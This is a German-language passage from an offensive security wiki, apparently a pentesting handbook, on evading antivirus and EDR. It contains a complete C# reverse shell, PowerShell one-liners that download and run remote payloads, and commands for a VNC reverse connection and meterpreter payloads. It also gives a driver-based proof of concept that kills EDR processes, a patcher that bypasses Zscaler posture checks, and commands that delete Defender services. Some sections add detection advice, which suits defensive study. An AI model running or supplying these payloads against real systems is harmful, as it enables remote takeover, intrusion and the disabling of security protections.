## Fortgeschrittene Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion ist ein sehr komplexes Thema. Manchmal musst du die vielen verschiedenen Telemetriequellen eines einzelnen Systems berücksichtigen. In ausgereiften Umgebungen ist es daher nahezu unmöglich, vollständig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dir dringend, dir diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittene Evasion-Techniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dies ist ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Alte Techniken**

### **Prüfen, welche Teile Defender als schädlich erkennt**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden. Das Tool **entfernt Teile der Binärdatei**, bis es **herausfindet, welchen Teil Defender** als schädlich erkennt, und gibt diesen Teil aus.\
Ein weiteres Tool, das **dasselbe tut, ist** [**avred**](https://github.com/dobin/avred). Es bietet den Dienst über eine offene Weboberfläche unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) an.

### **Telnet-Server**

Bis Windows 10 enthielten alle Windows-Versionen einen **Telnet-Server**, den du als Administrator folgendermaßen installieren konntest:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Sorge dafür, dass es beim Systemstart **gestartet** wird, und **führe** es jetzt aus:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet-Port ändern (Stealth) und Firewall deaktivieren:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Lade es herunter unter: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du benötigst die Bin-Downloads, nicht das Setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Lege ein Passwort unter _VNC Password_ fest
- Lege ein Passwort unter _View-Only Password_ fest

Verschiebe dann die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf den **Victim**

#### **Reverse connection**

Der **Angreifer** sollte auf seinem **Host** die Binärdatei `vncviewer.exe -listen 5900` ausführen, damit er bereit ist, eine Reverse-VNC-Verbindung entgegenzunehmen. Starte dann auf dem **Victim** den winvnc-Daemon mit `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus.

**WARNUNG:** Um Stealth zu wahren, solltest du Folgendes vermeiden:

- Starte `winvnc` nicht, wenn es bereits läuft, sonst wird ein [Popup](https://i.imgur.com/1SROTTl.png) ausgelöst. Prüfe mit `tasklist | findstr winvnc`, ob es läuft.
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst wird [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) geöffnet.
- Führe `winvnc -h` nicht aus, um Hilfe aufzurufen, sonst wird ein [Popup](https://i.imgur.com/oc18wcu.png) ausgelöst.

### GreatSCT

Lade es herunter unter: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

In GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Starte nun **den Lister** mit `msfconsole -r file.rc` und **führe** die **XML-Payload** aus mit:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Der aktuelle Defender beendet den Prozess sehr schnell.**

### Unsere eigene reverse shell kompilieren

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere sie mit:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Verwenden Sie es mit:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# mit Compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C#-Obfuscatoren-Liste: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel für die Verwendung von Python zum Erstellen von Injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel-Space ausschalten

Storm-2603 setzte ein kleines Konsolenprogramm namens **Antivirus Terminator** ein, um den Endpunktschutz zu deaktivieren, bevor es Ransomware ablegte. Das Tool bringt seinen **eigenen anfälligen, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst AV-Dienste mit Protected-Process-Light (PPL) nicht blockieren können.<sup>[[12]](#references)</sup>

Wichtige Erkenntnisse
1. **Signierter Treiber**: Die auf dem Datenträger abgelegte Datei heißt `ServiceMouse.sys`, doch die Binärdatei ist der legitim signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ „System In-Depth Analysis Toolkit“. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er auch bei aktivierter Driver-Signature-Enforcement (DSE) geladen.
2. **Dienstinstallation**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die erste Zeile registriert den Treiber als **kernel service**, und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland zugänglich wird.
3. **Vom Treiber bereitgestellte IOCTLs**
   | IOCTL code | Fähigkeit                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Einen beliebigen Prozess anhand seiner PID beenden (wird verwendet, um Defender-/EDR-Dienste zu beenden) |
   | `0x990000D0` | Eine beliebige Datei auf dem Datenträger löschen |
   | `0x990001D0` | Den Treiber entladen und den Dienst entfernen |

   Minimaler C-Proof-of-Concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Warum es funktioniert**: BYOVD umgeht user-mode-Schutzmechanismen vollständig; im Kernel ausgeführter Code kann *geschützte* Prozesse öffnen, beenden oder Kernel-Objekte manipulieren, unabhängig von PPL/PP, ELAM oder anderen Härtungsfunktionen.

Erkennung / Abwehr
•  Aktivieren Sie Microsofts Blockliste für anfällige Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.
•  Überwachen Sie das Erstellen neuer *Kernel*-Dienste und lösen Sie einen Alarm aus, wenn ein Treiber aus einem für alle beschreibbaren Verzeichnis geladen wird oder nicht auf der Zulassungsliste steht.
•  Achten Sie auf Handles im user-mode zu benutzerdefinierten Geräteobjekten, gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Umgehen der Posture-Prüfungen von Zscaler Client Connector durch Binary-Patching auf der Festplatte

Zscalers **Client Connector** wendet Geräte-Posture-Regeln lokal an und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen ermöglichen einen vollständigen Bypass:

1. Die Posture-Auswertung erfolgt **vollständig clientseitig** (ein Boolean wird an den Server gesendet).
2. Interne RPC-Endpunkte prüfen lediglich, ob die verbindende ausführbare Datei **von Zscaler signiert** ist (über `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Durch **das Patchen von vier signierten Binaries auf der Festplatte** lassen sich beide Mechanismen neutralisieren:

| Binary | Gepatchte ursprüngliche Logik | Ergebnis |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als konform gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder Prozess (auch ein nicht signierter) kann sich mit den RPC-Pipes verbinden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen des Tunnels | Kurzgeschlossen |

Minimaler Patcher-Auszug:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nach dem Ersetzen der Originaldateien und dem Neustart des Dienst-Stacks:

* **Alle** Posture-Checks werden als **grün/konform** angezeigt.
* Nicht signierte oder veränderte Binärdateien können die Named-Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das durch die Zscaler-Richtlinien definierte interne Netzwerk.

Diese Fallstudie zeigt, wie sich rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgehen lassen.

## Missbrauch vertrauenswürdiger Funktionen in Microsoft Defender `BTR.sys`

Defenders **Boot-Time Removal**-Treiber ist ein nützliches Gegenbeispiel zu klassischem BYOVD. `BTR.sys` ist eine legitime, von Microsoft signierte Remediation-Komponente ohne Memory-Corruption-Bug und ohne IOCTL-Schnittstelle. Nachdem ein Operator Administratorzugriff und `SeLoadDriverPrivilege` erlangt hat, kann er stattdessen die private Remediation-Transaktion fälschen und die vorgesehenen Datei-/Registry-Operationen im Ring 0 ausführen. Dies ist ein **Primitive zur Neutralisierung von AV/EDR nach einer Kompromittierung, nicht für Initial Access oder Privilege Escalation**. Außerdem lässt sich der Treiber aus der `BOOTTIMETOOL`-Ressource der `MpEngine.dll` des Ziels extrahieren, statt einen auffälligen Treiber eines Drittanbieters einzubinden.<sup>[[36]](#references)</sup>

### Bereitstellung des One-Shot-Treibers

Defender legt die Ressource normalerweise als Datei mit zufälligem Namen im Format `[a-z]{8}.sys` ab und registriert einen ähnlich benannten Kernel-Dienst. `DriverEntry` liest den `Args`-Wert des Dienstes, öffnet den referenzierten NTFS-ADS, entschlüsselt und validiert die Aktionsliste, schreibt Feedback und gibt nach erfolgreicher Ausführung `0xC0000056` (`STATUS_DELETE_PENDING`) zurück, damit der Treiber entladen wird, anstatt resident zu bleiben. Ein gefälschter Dienst weist die folgenden charakteristischen Werte auf.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Der `:changelist`-Stream enthält einen RC4-verschlüsselten Blob. Die analysierten Builds verwenden denselben festgelegten 256-Byte-Schlüssel wieder, sodass die Verschlüsselung keine Autorisierungsgrenze darstellt. Ein gültiger Klartext besteht aus einem 24-Byte-Global-Header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, Header-CRC und einer aus der Payload abgeleiteten Transaktions-ID), gefolgt von einem nullterminierten UTF-16-Feedbackpfad und beliebig vielen Elementen. Jedes Element hat einen 16-Byte-Header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) sowie aktionsspezifische Daten, die mit **genau vier NUL-Bytes** enden. Jeder Header- und Datenbereich wird unabhängig mit dem CRC-32-Polynom `0xEDB88320`, dem Anfangszustand `0xFFFFFFFF` und **ohne abschließendes XOR** (`~CRC32`) geprüft; der CRC-Zustand wird für jeden Bereich zurückgesetzt.<sup>[[36]](#references)[[37]](#references)</sup>

Die akzeptierten Aktions-IDs stellen folgende Kernel-Primitiven bereit.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Elementdaten | Ergebnis |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Eine Datei löschen, auch wenn sie gesperrt ist |
| 2 | `[UTF-16 path]` | Ein leeres Verzeichnis entfernen |
| 3 | `[Flags][source][destination]` | Eine Datei in einen vom Angreifer ausgewählten geschützten Pfad verschieben; ein leeres Ziel bedeutet löschen |
| 4 | `[Flags][key path]` | Einen Registrierungsschlüssel rekursiv löschen |
| 5 | `[Flags][key path + "\\" + value]` | Einen Registrierungswert löschen |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Einen Registrierungswert erstellen/aktualisieren und fehlende Schlüsselpfade erstellen |

Bei den Aktionen 5 und 6 ist das Trennzeichen zwischen Schlüssel und Wert auf dem Wire **zwei aufeinanderfolgende Backslashes**; ein konventionell formatierter Pfad wird nicht korrekt aufgeteilt. Die Feedbackdatei spiegelt größtenteils die Anfrage wider, aber die ersten vier Datenbytes jedes Elements werden zu dessen resultierendem `NTSTATUS`. Bei den Aktionen 1 und 2, die kein führendes Flags-Feld haben, verschiebt BTR den Pfad in die vier reservierten nachfolgenden Bytes, um Platz für diesen Status zu schaffen.<sup>[[36]](#references)</sup>

### `BTR_CLI`-Workflow und Frühstartfenster

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementiert die vollständige Kette: `BTR.sys` aus dem lokalen Defender extrahieren, `<random>.sys:changelist` und einen Feedback-Stream erstellen, verkettete Aktionen serialisieren, Prüfsummen berechnen und verschlüsseln, den Dienstregistrierungsschlüssel direkt erstellen und anschließend `NtLoadDriver` für `-trigger now` aufrufen oder den Treiber für `-trigger boot` als Systemstarttreiber belassen. Die direkte Bereitstellung in der Registrierung umgeht den regulären SCM-`CreateServiceW`-Pfad und erzeugt daher **kein** Dienstinstallationsereignis mit der ID 7045. Mit `BTR_CLI.exe -cleanup <service_name>` können später durch den Boot-Trigger erstellte Artefakte entfernt werden.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` ist nicht verwendbar, da BTR Datei-E/A aus `DriverEntry` ausführt, bevor der Storage-Stack und der `SystemRoot`-Link bereit sind. `Start=1` zusammen mit der hochpriorisierten Gruppe `Boot Bus Extender` wird stattdessen in Phase 1 ausgeführt: NTFS ist verwendbar, aber viele sicherheitsrelevante Systemstart-Treiber und EDR-Dienste im Benutzermodus wurden noch nicht initialisiert. Boot-Start-Filter wie `WdFilter` sind möglicherweise bereits geladen, doch BTR kann ihre Binärdateien oder Dienstkonfiguration vor dem nächsten Start entfernen und Dienst-EXEs löschen, bevor SCM sie startet. ELAM schließt diese Lücke nicht, da BTR nach der Boot-Start-Auswertung ausgeführt wird und eine gültige Microsoft-Signatur besitzt.<sup>[[36]](#references)</sup>

Mehrere Aktionen werden in einer Transaktion ausgeführt. Der PoC stellt Action 1 für die fest codierte Datei `\SystemRoot\Temp\BootClean.log` voran: BTR erstellt diese Protokolldatei, verarbeitet dann seinen eigenen Löschauftrag und entfernt sie, bevor der Treiber entladen wird. Das verringert die Spuren. Werden Rückmeldungen in `<random>.sys:<random>.dat` abgelegt, lassen sich der Treiber und beide Streams gemeinsam entfernen.<sup>[[36]](#references)[[37]](#references)</sup>

### Erkennungskorrelationen mit hoher Aussagekraft

Regeln, die nur Signaturen prüfen, und die Microsoft-Sperrliste für anfällige Treiber verhindern keinen Missbrauch der vorgesehenen BTR-Funktionalität. Bevorzugt sollten die folgenden Verhaltenskorrelationen verwendet werden. Dabei ist die legitime Defender-Abstammung von einem beliebigen Launcher zu unterscheiden.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Die Erstellung von `.sys:changelist` ist bei der BTR-Bereitstellung universell. Ein `.dat`-ADS, der an dieselbe `.sys`-Datei angehängt ist, ist besonders verdächtig, da legitimer Defender Rückmeldungen normalerweise unter `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` ablegt.
- **Sysmon 12/13 ohne System 7045:** Die direkte Erstellung von `HKLM\SYSTEM\CurrentControlSet\Services\<random>` korrelieren, wenn der Schlüssel `Args=...:changelist` und `Group=Boot Bus Extender` enthält und kein passendes SCM-Installationsereignis vorliegt.
- **Sysmon 6 -> 23:** Das Laden eines bekannten BTR-Treibers, der nicht aus der Defender-Abstammung stammt, mit einer anschließenden, `System`/PID 4 zugeordneten Dateilöschung korrelieren, insbesondere bei Sicherheitsdateien.
- **Sysmon 11 -> 23:** Bei schneller Erstellung und Löschung von `\SystemRoot\Temp\BootClean.log` durch `System`/PID 4 alarmieren.
- Die Zuweisung und Aktivierung von `SeLoadDriverPrivilege` einschränken und protokollieren. Eine Microsoft-Signatur allein bietet keine ausreichende Vertrauensgrundlage, wenn ein Sicherheitstool-Treiber durch `cmd.exe`, PowerShell oder einen unbekannten Prozess bereitgestellt wird.

## Protected Process Light (PPL) missbrauchen, um AV/EDR mit LOLBINs zu manipulieren

Protected Process Light (PPL) erzwingt eine Signatur-/Ebenenhierarchie, sodass nur gleichwertige oder höher geschützte Prozesse einander manipulieren können. Wenn du offensiv ein PPL-fähiges Binary legitim starten und dessen Argumente kontrollieren kannst, lässt sich gutartige Funktionalität (z. B. Protokollierung) in eine eingeschränkte, PPL-gestützte Schreibprimitive für geschützte Verzeichnisse umwandeln, die von AV/EDR genutzt werden.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Was einen Prozess als PPL ausführt
- Die Ziel-EXE (und alle geladenen DLLs) muss mit einer PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess und den Flags `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` erstellt werden.
- Es muss eine kompatible Schutzebene angefordert werden, die zur Signatur des Binaries passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signaturen, `PROTECTION_LEVEL_WINDOWS` für Windows-Signaturen). Falsche Ebenen führen beim Erstellen zum Fehler.

Eine umfassendere Einführung in PP/PPL und den LSASS-Schutz findest du hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Hilfsprogramm: CreateProcessAsPPL (wählt die Schutzebene aus und leitet Argumente an die Ziel-EXE weiter):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Verwendungsmuster:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN-Primitive: ClipUp.exe
- Die signierte Systembinärdatei `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei an einem vom Aufrufer angegebenen Pfad zu schreiben.
- Wird sie als PPL-Prozess gestartet, erfolgt der Schreibvorgang mit PPL-Rechten.
- ClipUp kann keine Pfade mit Leerzeichen verarbeiten; verwende 8.3-Kurznamen, um auf normalerweise geschützte Speicherorte zu verweisen.

8.3-Kurze-Pfade-Hilfsmittel
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzen Pfad in cmd ermitteln: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Missbrauchskette (abstrakt)
1) Starte das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` über einen Launcher (z. B. CreateProcessAsPPL).
2) Übergib das ClipUp-Argument für den Logpfad, um eine Datei in einem geschützten AV-Verzeichnis erstellen zu lassen (z. B. Defender Platform). Verwende bei Bedarf 8.3-Kurznamen.
3) Wenn die Zieldatei normalerweise geöffnet oder vom laufenden AV gesperrt ist (z. B. MsMpEng.exe), plane den Schreibvorgang beim Systemstart ein, bevor der AV gestartet wird, indem du einen Autostartdienst installierst, der zuverlässig früher ausgeführt wird. Überprüfe die Startreihenfolge mit Process Monitor (Boot-Logging).
4) Beim Neustart erfolgt der durch PPL abgesicherte Schreibvorgang, bevor der AV seine Binärdateien sperrt. Dadurch wird die Zieldatei beschädigt und der Start verhindert.

Beispielaufruf (Pfade aus Sicherheitsgründen redigiert/gekürzt):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Hinweise und Einschränkungen
- Du kannst den Inhalt, den ClipUp schreibt, nicht steuern, sondern nur dessen Platzierung; die Primitive eignet sich daher eher für Beschädigungen als für präzise Inhalteinschleusung.
- Zum Installieren/Starten eines Dienstes und für ein Zeitfenster zum Neustart sind lokale Administratorrechte/SYSTEM erforderlich.
- Das Timing ist entscheidend: Das Ziel darf nicht geöffnet sein; die Ausführung beim Systemstart vermeidet Dateisperren.

Erkennungen
- Prozesserstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere mit nicht standardmäßigen Startern als übergeordneten Prozessen, rund um den Systemstart.
- Neue Dienste, die so konfiguriert sind, dass sie verdächtige Binärdateien automatisch starten und konsistent vor Defender/AV starten. Untersuche die Erstellung/Änderung von Diensten vor Ausfällen beim Start von Defender.
- Überwachung der Dateiintegrität von Defender-Binärdateien/Platform-Verzeichnissen; unerwartete Dateierstellungen/-änderungen durch Prozesse mit Protected-Process-Flags.
- ETW/EDR-Telemetrie: Suche nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, sowie nach anomaler Verwendung von PPL-Levels durch Nicht-AV-Binärdateien.

Abhilfemaßnahmen
- WDAC/Code Integrity: Beschränke, welche signierten Binärdateien als PPL ausgeführt werden dürfen und unter welchen übergeordneten Prozessen; blockiere ClipUp-Aufrufe außerhalb legitimer Kontexte.
- Diensthygiene: Beschränke die Erstellung/Änderung automatisch startender Dienste und überwache Manipulationen der Startreihenfolge.
- Stelle sicher, dass der Manipulationsschutz von Defender und die Early-Launch-Schutzmaßnahmen aktiviert sind; untersuche Startfehler, die auf beschädigte Binärdateien hindeuten.
- Ziehe in Betracht, die Generierung von 8.3-Kurznamen auf Volumes zu deaktivieren, auf denen Sicherheitstools liegen, sofern das mit deiner Umgebung kompatibel ist (gründlich testen).

## Manipulation von Microsoft Defender über einen Symlink-Hijack des Platform-Versionsordners

Windows Defender wählt die Plattform, von der es ausgeführt wird, indem es die Unterordner unter folgendem Pfad auflistet:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Es wählt den Unterordner mit der lexikografisch höchsten Versionszeichenfolge aus (z. B. `4.18.25070.5-0`) und startet dann von dort aus die Defender-Dienstprozesse (wobei Dienst-/Registry-Pfade entsprechend aktualisiert werden). Bei dieser Auswahl werden Verzeichniseinträge, einschließlich Verzeichnis-Reparse-Points (Symlinks), als vertrauenswürdig behandelt. Ein Administrator kann dies ausnutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und DLL sideloading oder eine Dienstunterbrechung zu erreichen.<sup>[[21]](#references)[[22]](#references)</sup>

Voraussetzungen
- Lokaler Administrator (zum Erstellen von Verzeichnissen/Symlinks im Platform-Ordner erforderlich)
- Möglichkeit, einen Neustart durchzuführen oder die erneute Auswahl der Defender-Plattform auszulösen (Dienstneustart beim Systemstart)
- Es sind nur integrierte Tools erforderlich (`mklink`)

Warum es funktioniert
